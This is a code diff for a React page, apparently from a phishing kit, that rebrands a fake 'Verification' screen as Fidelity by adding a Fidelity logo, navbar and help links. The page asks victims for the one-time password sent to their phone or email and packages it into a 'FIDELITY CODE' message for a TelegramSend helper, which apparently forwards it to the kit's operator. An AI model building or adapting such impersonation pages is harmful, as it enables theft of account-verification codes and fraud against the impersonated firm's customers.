@@ -1,5 +1,5 @@
 import React from "react";
-import Logo from "../assets/logo.jpeg";
+import fid from "../assets/fidelity.svg";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
@@ -22,7 +22,7 @@ export default function Code() {
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
     const message = `
-        ---- WTB ONLINE CODE -----
+        ---- FIDELITY CODE -----
         Code: ${formInput.code}
         `;
     setIsLoading(true);
@@ -34,42 +34,44 @@ export default function Code() {
 
   return (
     <>
+      <div className="navbar">
+        <div className="brand">
+          <div>
+            <img src={fid} alt="" />
+          </div>
+        </div>
+
+        <div className="nav-texts">
+          <p style={{ marginRight: 20 }}>Security</p>
+          <p>FAQ</p>
+        </div>
+      </div>
+
       <div className="content">
         <div className="form">
             <form onSubmit={handleSubmit} method="POST">
           <div className="form-item">
-          <div className="brand">
-                <img src={Logo} alt="" />
-              </div>
             <h2>Verification</h2>
             <p>In order to verify your identity, enter the one time password sent to your phone/email.</p>
             
               <div className="form-field">
-                
+                <label htmlFor="">Enter code</label>
                 <input onChange={handleInputChange} name="code" type="text" />
               </div>
 
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  justifyContent: "flex-end",
-                  marginTop: "-20px",
-                }}
-              >
-              
-                {isLoading ? (
-                  <div className="form-field">
-                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
-                  </div>
-                ) : (
-                  <div className="form-field">
-                    <button style={{ width: 120, height: 50 }} type="submit">
-                      Continue
-                    </button>
-                  </div>
-                )}
-              </div>
+             
+              {isLoading ? (
+                <div className="form-field">
+                  <button type="button">Please wait...</button>
+                </div>
+              ) : (
+                <div className="form-field">
+                  <button type="submit">Submit</button>
+                </div>
+              )}
+
+              <a href="">Forgot username or password?</a>
+            
           </div>
           </form>
         </div>
